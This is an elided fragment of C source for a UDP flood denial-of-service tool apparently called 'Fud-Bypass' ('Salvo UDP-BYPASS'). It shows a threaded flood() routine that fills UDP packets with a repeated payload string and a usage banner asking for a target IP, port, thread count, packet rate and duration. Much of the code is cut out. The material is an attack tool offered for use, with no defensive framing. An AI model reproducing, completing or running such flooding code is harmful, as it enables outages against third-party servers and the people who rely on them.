...
void *flood(void *par1)
{
   ...
   if(payload1==1){ // Payload 1
	...
	lenght = shortrandom;	
	memcpy((void *)udph + sizeof(struct udphdr), "%randompayload%randompayload%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%randompayload%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%randompayload%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%randompayload%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%randompayload%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%randompayload%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%randompayload%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%randompayload%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%randompayload%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%%randompayload%", 111);
...
{
        if(argc < 5){
		char launc[]="\033[1;34mEncoder by GLITCH // SCITZE\033[0m\n";
		printf(launc);
		char bypassv1[]="\033[1;32mRelease 1.0.0 - Salvo UDP-BYPASS\033[0m\n";
        printf(bypassv1);
		char crasher[]="\033[1;31mUsage: ./Fud-Bypass <ip> <port> <threads> <pps> <random & integer> <time>\033[0m\n";
        printf(crasher);
        exit(-1);
        }        
